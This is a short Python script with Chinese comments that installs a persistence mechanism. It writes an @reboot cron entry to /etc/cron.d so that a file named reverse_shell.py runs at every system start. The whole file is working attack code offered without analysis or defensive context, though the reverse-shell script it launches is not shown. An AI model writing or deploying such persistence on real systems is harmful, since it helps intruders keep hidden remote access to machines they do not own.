import os

# 設置 cron 任務
def create_persistence():
    cron_job = "@reboot python3 /path/to/reverse_shell.py\n"
    with open("/etc/cron.d/reverse_shell", "w") as f:
        f.write(cron_job)

# 執行持久化
create_persistence()
